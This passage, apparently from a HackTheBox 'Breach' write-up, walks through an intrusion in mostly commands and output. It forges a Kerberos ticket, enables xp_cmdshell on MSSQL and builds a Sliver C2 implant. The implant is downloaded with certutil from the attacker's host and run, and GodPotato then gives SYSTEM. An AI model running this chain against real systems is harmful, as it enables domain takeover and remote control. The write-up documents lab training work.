christine.bruce\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Creating basic skeleton ticket and PAC Infos\n[*] Customizing ticket for breach.vl/christine.bruce\n[*]     PAC_LOGON_INFO\n[*]     PAC_CLIENT_INFO_TYPE\n[*]     EncTicketPart\n[*]     EncTGSRepPart\n[*] Signing/Encrypting final ticket\n[*]     PAC_SERVER_CHECKSUM\n[*]     PAC_PRIVSVR_CHECKSUM\n[*]     EncTicketPart\n[*]     EncTGSRepPart\n[*] Saving ticket in christine.bruce.ccache\n</code></pre></p> <p>My access when connecting to the mssql instance with these credentials is dbo <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ KRB5CCNAME=$(pwd)/christine.bruce.ccache impacket-mssqlclient -k -no-pass breach.vl/christine.bruce@breachdc.breach.vl\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(BREACHDC\\SQLEXPRESS): Line 1: Changed database context to 'master'.\n[*] INFO(BREACHDC\\SQLEXPRESS): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) \n[!] Press help for extra shell commands\nSQL (BREACH\\Administrator  dbo@master)&gt;\n</code></pre></p> <p>Enable xp_cmdshell <pre><code>SQL (BREACH\\Administrator  dbo@master)&gt; enable_xp_cmdshell\nINFO(BREACHDC\\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.\nINFO(BREACHDC\\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.\n</code></pre></p> <p>Start sliver-server, enabling multiplayer, also stand up an mtls listener on 8443 with a timeout of 240. <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ sliver-server\n[*] Loaded 23 aliases from disk\n[*] Loaded 151 extension(s) from disk\n\n    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2557     \u2588\u2588\u2557\u2588\u2588\u2557   \u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557\n    \u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2551     \u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\n    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551     \u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\n    \u255a\u2550\u2550\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2551     \u2588\u2588\u2551\u255a\u2588\u2588\u2557 \u2588\u2588\u2554\u255d\u2588\u2588\u2554\u2550\u2550\u255d  \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\n    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2554\u255d \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551  \u2588\u2588\u2551\n    \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u2550\u2550\u255d  \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d\n\nAll hackers gain annihilator\n[*] Server v1.5.43 - e116a5ec3d26e8582348a29cfd251f915ce4a405\n[*] Welcome to the sliver shell, please type 'help' for options\n\n[*] Check for updates with the 'update' command\n\n[server] sliver &gt; multiplayer \n\n[*] Multiplayer mode enabled!\n\n[server] sliver &gt; mtls -t 240 --lport 8443\n\n[*] Starting mTLS listener ...\n\n[*] Successfully started job #3\n\n[server] sliver &gt;\n</code></pre></p> <p>Generate a new operator profile <pre><code>[server] sliver &gt; new-operator --lhost 10.10.14.204 --save duff --name duff\n\n[*] Generating new client certificate, please wait ... \n[*] Saved new client config to: /home/notroot/htb/machines/breach/duff \n</code></pre></p> <p>In another shell, import the profile into sliver-client.  Connect. <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ sliver-client import duff\n2025/10/25 03:26:23 Saved new client config to: /home/notroot/.sliver-client/configs/duff_10.10.14.204.cfg\n\n\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ sliver-client\n? Select a server: duff@10.10.14.204 (a0e0ed1e78716827)\nConnecting to 10.10.14.204:31337 ...\n[*] Loaded 23 aliases from disk\n[*] Loaded 151 extension(s) from disk\n\n.------..------..------..------..------..------.\n|S.--. ||L.--. ||I.--. ||V.--. ||E.--. ||R.--. |\n| :/\\: || :/\\: || (\\/) || :(): || (\\/) || :(): |\n| :\\/: || (__) || :\\/: || ()() || :\\/: || ()() |\n| '--'S|| '--'L|| '--'I|| '--'V|| '--'E|| '--'R|\n`------'`------'`------'`------'`------'`------'\n\nAll hackers gain assist\n[*] Server v1.5.43 - e116a5ec3d26e8582348a29cfd251f915ce4a405\n[*] Welcome to the sliver shell, please type 'help' for options\n\n[*] Check for updates with the 'update' command\n\nsliver &gt;\n</code></pre></p> <p>Generate an implant <pre><code>sliver &gt; generate -l -G -t 240 -m 10.10.14.204:8443 -a amd64 -o windows -j 60 -s a.exe\n\n[*] Generating new windows/amd64 implant binary\n[!] Symbol obfuscation is disabled\n[*] Build completed in 2s\n[*] Implant saved to /home/notroot/htb/machines/breach/a.exe\n</code></pre></p> <p>Serve it <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/breach]\n\u2514\u2500$ python3 -m http.server 443\nServing HTTP on 0.0.0.0 port 8443 (http://0.0.0.0:8443/) ...\n</code></pre></p> <p>On the mssqlclient, use xp_cmdshell to download the implant to the host</p> <pre><code>SQL (BREACH\\Administrator  dbo@master)&gt; xp_cmdshell cmd.exe /c certutil -urlcache -split -f http://10.10.14.204:443/a.exe  \\windows\\tasks\\a.exe\noutput                                                \n---------------------------------------------------   \n****  Online  ****                                    \n\n  000000  ...                                         \n\n  988a00                                              \n\nCertUtil: -URLCache command completed successfully.   \n\nNULL \n</code></pre> <p>Invoke the implant <pre><code>SQL (BREACH\\Administrator  dbo@master)&gt; xp_cmdshell cmd.exe /c \\windows\\tasks\\a.exe\n</code></pre></p> <p>The user context is high integrity, with SeImpersonatePrivilege. <pre><code>PS C:\\Windows\\system32&gt; whoami /groups\nwhoami /groups\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                                 Type             SID                                                             Attributes                                        \n========================================== ================ =============================================================== ==================================================\nEveryone                                   Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Users                              Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                                    Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\SERVICE                       Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group\nCONSOLE LOGON                              Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users           Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization             Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group\nNT SERVICE\\MSSQL$SQLEXPRESS                Well-known group S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133 Enabled by default, Enabled group, Group owner    \nLOCAL                                      Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group\nAuthentication authority asserted identity Well-known group S-1-18-1                                                        Mandatory group, Enabled by default, Enabled group\nMandatory Label\\High Mandatory Level       Label            S-1-16-12288                                                                                                      \nPS C:\\Windows\\system32&gt; whoami /priv\nwhoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                               State   \n============================= ========================================= ========\nSeAssignPrimaryTokenPrivilege Replace a process level token             Disabled\nSeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled\nSeMachineAccountPrivilege     Add workstations to domain                Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking                  Enabled \nSeManageVolumePrivilege       Perform volume maintenance tasks          Enabled \nSeImpersonatePrivilege        Impersonate a client after authentication Enabled \nSeCreateGlobalPrivilege       Create global objects                     Enabled \nSeIncreaseWorkingSetPrivilege Increase a process working set            Disabled\nPS C:\\Windows\\system32&gt; whoami /user\nwhoami /user\n\nUSER INFORMATION\n----------------\n\nUser Name        SID                                          \n================ =============================================\nbreach\\svc_mssql S-1-5-21-2330692793-3312915120-706255856-1115\n</code></pre></p>"},{"location":"writeups/HackTheBox/Machines/Breach/#escalate","title":"Escalate","text":"<p>Upload GodPotato.exe <pre><code>sliver (COLOURFUL_GUILTY) &gt; upload /var/www/html/GodPotato-NET4.exe /windows/tasks/godpotato.exe\n\n[*] Wrote file to C:\\windows\\tasks\\godpotato.exe\n</code></pre></p> <p>Loosen dacls around the implant <pre><code>$path=\"c:\\windows\\tasks\"; (Get-ChildItem -path $path\\* -Recurse).FullName | % {$Acl = Get-ACL $_; $AccessRule= New-Object System.Security.AccessControl.FileSystemAccessRule(\"Everyone\",\"FullControl\",\"none\",\"none\",\"Allow\");$Acl.AddAccessRule($AccessRule);Set-Acl $_ $Acl}\n</code></pre></p> <p>Godpotato for escalation <pre><code>PS C:\\Windows\\system32&gt; cd \\windows\\tasks\ncd \\windows\\tasks\nPS C:\\windows\\tasks&gt; .\\godpotato.exe -cmd \"cmd.exe /c .\\a.exe\"\n.\\godpotato.exe -cmd \"cmd.exe /c .\\a.exe\"\n[*] CombaseModule: 0x140732047294464\n[*] DispatchTable: 0x140732049885048\n[*] UseProtseqFunction: 0x140732049177392\n[*] UseProtseqFunctionParamCount: 6\n[*] HookRPC\n[*] Start PipeServer\n[*] CreateNamedPipe \\\\.\\pipe\\01d890f9-0469-4a71-8628-fee24a4b0d37\\pipe\\epmapper\n[*] Trigger RPCSS\n[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046\n[*] DCOM obj IPID: 00005802-03c8-ffff-60ec-ae3827a25927\n[*] DCOM obj OXID: 0x6a8455b40cabdba3\n[*] DCOM obj OID: 0xa9eaaee4bb2b2694\n[*] DCOM obj Flags: 0x281\n[*] DCOM obj PublicRefs: 0x0\n[*] Marshal Object bytes len: 100\n[*] UnMarshal Object\n[*] Pipe Connected!\n[*] CurrentUser: NT AUTHORITY\\NETWORK SERVICE\n[*] CurrentsImpersonationLevel: Impersonation\n[*] Start Search System Token\n[*] PID : 916 Token:0x628  User: NT AUTHORITY\\SYSTEM ImpersonationLevel: Impersonation\n[*] Find System Token : True\n[*] UnmarshalObject: 0x80070776\n[*] CurrentUser: NT AUTHORITY\\SYSTEM\n[*] process start with pid 3004\n</code></pre></p> <p>On the new session, I am system. <pre><code>sliver (COLOURFUL_GUILTY) &gt; info\n\n        Session ID: c80f5dd8-d782-4bbf-abf6-1b18fb9fd2f5\n              Name: COLOURFUL_GUILTY\n          Hostname: BREACHDC\n              UUID: 91753042-9532-69dc-dbc7-e9484b42f13e\n          Username: NT AUTHORITY\\SYSTEM\n               UID: S-1-5-18\n               GID: S-1-5-18\n               PID: 7056\n                OS: windows\n           Version: Server 2016 build 20348 x86_64\n            Locale: en-US\n              Arch: amd64\n         Active C2: mtls://10.10.14.204:8443\n    Remote Address: 10.129.38.236:63285\n         Proxy URL: \nReconnect Interval: 1m0s\n     First Contact: Sat Oct 25 03:51:30 PDT 2025 (17s ago)\n      Last Checkin: Sat Oct 25 03:51:30 PDT 2025 (17s ago)\n\nsliver (COLOURFUL_GUILTY) &gt; getuid\n\nS-1-5-18\n\nsliver (COLOURFUL_GUILTY) &gt; whoami\n\nLogon ID: NT AUTHORITY\\SYSTEM\n[*] Current Token ID: NT AUTHORITY\\SYSTEM\n</code></pre></p> <p>Flag <pre><code>sliver (COLOURFUL_GUILTY) &gt; cat c:/users/administrator/desktop/root.txt\n\nfc98f418f94f8cdb9a30ef026fe64345\n</code></pre></p>"},{"location":"blog/","title":"Blog","text":""}]}